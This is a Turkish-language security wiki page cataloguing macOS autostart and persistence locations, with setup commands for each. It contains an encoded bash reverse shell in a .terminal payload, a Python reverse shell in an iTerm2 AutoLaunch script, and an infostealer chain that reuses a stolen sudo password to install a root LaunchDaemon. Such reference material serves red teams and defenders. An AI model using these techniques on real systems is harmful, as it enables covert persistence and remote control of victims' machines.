# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisini temel alır. Amaç, **daha fazla Autostart Locations** eklemek (mümkünse), günümüzde macOS'un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, **root izinlerine ihtiyaç duymadan**, bir şeyi yalnızca **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanıza olanak tanır.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`**, Mach-o içindeki `__Text.__config` bölümünde, launchd'nin başlatması gereken diğer iyi bilinen servisleri içeren gömülü bir property list'e sahiptir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` seçeneklerini içerebilir.
>
> Elbette code signing nedeniyle değiştirilemez.

#### Description & Exploitation

**`launchd`**, OX S kernel tarafından başlangıçta çalıştırılan **ilk** **process** ve kapanış sırasında son tamamlanan process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Yönetici tarafından yüklenen kullanıcı başına agents
- `/Library/LaunchDaemons`: Yönetici tarafından yüklenen sistem genelindeki daemons
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agents.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemons.

Bir kullanıcı login olduğunda, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist dosyaları **login olan kullanıcının izinleriyle** başlatılır.

**Agents ve daemons arasındaki temel fark, agents'ların kullanıcı login olduğunda, daemons'ların ise system startup sırasında yüklenmesidir** (örneğin ssh gibi, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gereken servisler vardır). Ayrıca agents GUI kullanabilirken daemons arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**kullanıcı giriş yapmadan önce** bir **agent'ın çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknoloji sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` içinde bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örneğe bakın).

> [!TIP]
> Yeni Daemons veya Agents config dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` kullanılarak **yüklenecektir**. `.plist` uzantısı olmayan dosyaları **yüklemek de mümkündür**: `launchctl -F <file>` (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` ile **unload** etmek de mümkündür (bu dosyanın işaret ettiği process sonlandırılır),
>
> Bir **Agent** veya **Daemon**'ın **çalışmasını** **engelleyen** herhangi bir şeyin (örneğin bir override) **olmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm agent ve daemon'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (password reuse)

Yakın zamanda görülen bir macOS infostealer, bir **captured sudo password** kullanarak bir user agent ve root LaunchDaemon yerleştirdi:

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hâle getirin.
- Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan password'ü `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, sahibini `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için `nohup ~/.agent >/dev/null 2>&1 &` kullanarak agent'ı sessizce başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Bir plist bir kullanıcıya aitse, daemon system wide klasörlerinde olsa bile, **task kullanıcı olarak** ve root olarak değil **yürütülür**. Bu, bazı privilege escalation saldırılarını engelleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan ilk **user mode** process'tir. Process'in başlatılması **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Hatta bazı **killing signals**'lara karşı **korumalıdır**.

`launchd`'nin yapacağı ilk şeylerden biri, tüm **daemon**'ları başlatmaktır:

- Zamanlanarak yürütülen **Timer daemon**'ları:
- atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak üzere `StartCalendarInterval` değerine sahiptir
- **Network daemon**'ları:
- `org.cups.cups-lpd`: TCP üzerinde (`SockType: stream`), `printer` adlı `SockServiceName` ile dinler
- SockServiceName bir port veya `/etc/services` içindeki bir service olmalıdır
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
- Belirtilen bir path değiştiğinde yürütülen **Path daemon**'ları:
- `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
- **IOKit notification daemon**'ları:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'dır. SIP restricted folder olan `/System/Library/UserEventPlugins/` içinden plugin'leri yükler. Her plugin, `XPCEventModuleInitializer` key'inde initializer'ını belirtir veya eski plugin'lerde, `Info.plist` dosyasının `FB86416D-6164-2070-726F-70735C216EC0` key'i altındaki `CFPluginFactories` dict'inde belirtir.

### shell startup files

Yazı: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Yazı (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell'i yürüten ve TCC bypass özelliğine sahip bir app bulmanız gerekir

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açın
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açın
- Root gerekir
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkın
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkın
- Root gerekir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açın
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile tetiklenmesi beklenir, ancak **installed değildir** ve installed edildikten sonra bile şu error alınır: xterm: `DISPLAY is not set`

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell environment başlatıldığında, **belirli startup file'lar çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Bu shell, Terminal application başlatıldığında veya bir device SSH üzerinden erişildiğinde otomatik olarak açılır. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça çağrılmaları gerekir.

**`man zsh`** ile okuyabileceğimiz zsh man page'i, startup file'lar hakkında uzun bir açıklamaya sahiptir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation yöntemini yapılandırmak ve oturumu kapatıp yeniden açmak, hatta yeniden başlatmak uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu; bu işlemler gerçekleştirilirken çalışıyor olması gerekebilir.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Yeniden başlatıldığında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir.

Bu nedenle yeniden açılacak uygulamaların kendi uygulamanızı çalıştırmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**Bu listeye bir uygulama eklemek için** şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal use to have FDA permissions of the user use it

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Open Terminal

#### Description & Exploitation

**`~/Library/Preferences`** içinde kullanıcının Applications'lara ait tercihleri saklanır. Bu tercihlerin bazıları, **diğer applications/script'leri execute etmek** için bir yapılandırma içerebilir.

Örneğin Terminal, Startup sırasında bir command execute edebilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu config, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabiliyorsa, **`open`** işlevi **terminali açmak ve bu komutun çalıştırılmasını sağlamak** için kullanılabilir.

Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal kullanılarak kullanıcının FDA izinlerine sahip olunabilir

#### Location

- **Anywhere**
- **Trigger**: Terminal'i aç

#### Description & Exploitation

Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal application** otomatik olarak başlatılır ve içindeki belirtilen komutları çalıştırır. Terminal app'in bazı özel ayrıcalıkları (TCC gibi) varsa komutunuz bu özel ayrıcalıklarla çalıştırılır.

Şununla deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ayrıca normal shell script içeriğiyle **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal tarafından açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (çalıştırılan komutun bir Terminal penceresinde görünür olacağını unutmayın).

### Audio Plugin'leri

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Bazı ek TCC erişimleri elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
- **`~/Library/Audio/Plug-ins/Components`**
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak
- **`/System/Library/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatmak

#### Açıklama

Önceki writeup'lara göre bazı **audio plugin'lerini derlemek** ve yüklenmelerini sağlamak mümkündür.

### QuickLook Plugin'leri

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Bazı ek TCC erişimleri elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

QuickLook plugin'leri, **bir dosyanın önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve **bu dosya türünü destekleyen bir plugin** yüklü olduğunda çalıştırılabilir.

Kendi QuickLook plugin'inizi derlemek, yüklenmesi için önceki konumlardan birine yerleştirmek ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basmak mümkündür.

### ~~Login/Logout Hook'ları~~

> [!CAUTION]
> Bu işlem bende ne user LoginHook ile ne de root LogoutHook ile çalıştı.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şeyi çalıştırabilmeniz gerekir
- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur

Kullanımdan kaldırılmışlardır ancak bir user Login yaptığında komutları çalıştırmak için kullanılabilirler.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcıya ait olan şu konumda saklanır: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Koşullu Sandbox Bypass

> [!TIP]
> Burada, bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların kurulu olması**, **"yaygın olmayan" kullanıcı** eylemleri veya ortamlar gibi **çok yaygın olmayan koşulları** beklemenize olanak tanıyan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Cron

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `crontab` binary'sini çalıştırabiliyor olmanız gerekir
- Veya root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gerekir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Tetikleyici**: Cron job'a bağlıdır

#### Açıklama ve Exploitation

**Mevcut kullanıcının** cron job'larını şu komutla listeleyin:
```bash
crontab -l
```
Kullanıcıların tüm cron jobs kayıtlarını **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** dizinlerinde de görebilirsiniz (root gerekir).

MacOS'ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şuralarda bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada düzenli **cron** **jobs**, **at** **jobs** (çok sık kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulunur. Günlük periodic jobs örneğin şu komutla çalıştırılabilir: `periodic daily`.

Programatik olarak bir **user cronjob** eklemek için şunu kullanmak mümkündür:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 daha önce TCC izinlerine sahipti

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i açma

#### Açıklama ve Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan betikler çalıştırılır. Örneğin:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** betiği de çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komutu belirtebilir**.

Bu ayar iTerm2 settings bölümünde yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut tercihlere yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Çalıştırılacak komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**'ı abuse ederek arbitrary commands çalıştırmanın **başka yolları** olma ihtimali oldukça yüksektir.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar'ın kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, **`~/Library/Application\ Support/xbar/plugins/`** içinde xbar başlatıldığında çalıştırılacak bir shell script yazmak mümkündür:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon kurulmuş olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Ayrıca tam AppleScript kodunun entegre edilmesini ve shell scriptlerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.

Uygulama `~/.hammerspoon/init.lua` adlı tek bir dosyayı arar ve başlatıldığında bu script çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollara basıldığında yürütülecek uygulamaları veya script'leri belirtmeye olanak tanır. Bir saldırgan, **veritabanında kendi kısayolunu ve yürütülecek action'ı yapılandırarak** rastgele kod yürütülmesini sağlayabilir (bir kısayol yalnızca bir tuşa basmak olabilir).

### Alfred

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinlerini ister

#### Konum

- `???`

Belirli koşullar karşılandığında kod yürütebilen workflow'lar oluşturulmasına olanak tanır. Bir saldırganın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması potansiyel olarak mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA access elde etmek için kullanılır

#### Konum

- **`~/.ssh/rc`**
- **Tetikleyici**: ssh ile giriş
- **`/etc/ssh/sshrc`**
- Root gerektirir
- **Tetikleyici**: ssh ile giriş

> [!CAUTION]
> ssh'yi etkinleştirmek için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH ile giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri yürütülür.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `osascript`'i argümanlarla yürütmeniz gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Tetikleyici:** Giriş
- `osascript` çağrılarak depolanan Exploit payload
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Tetikleyici:** Giriş
- Root gerektirir

#### Açıklama

System Preferences -> Users & Groups -> **Login Items** bölümünde, **kullanıcı giriş yaptığında yürütülecek öğeleri** bulabilirsiniz.\
Bunları komut satırından listelemek, eklemek ve kaldırmak mümkündür:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Login items**, **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içindeki yapılandırmayı saklayan [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu bölüm onun bir uzantısıdır.)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** dosyayı açar. Örneğin ZIP dosyası **`~/Library`** içinde saklanmış ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist dosyası eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.

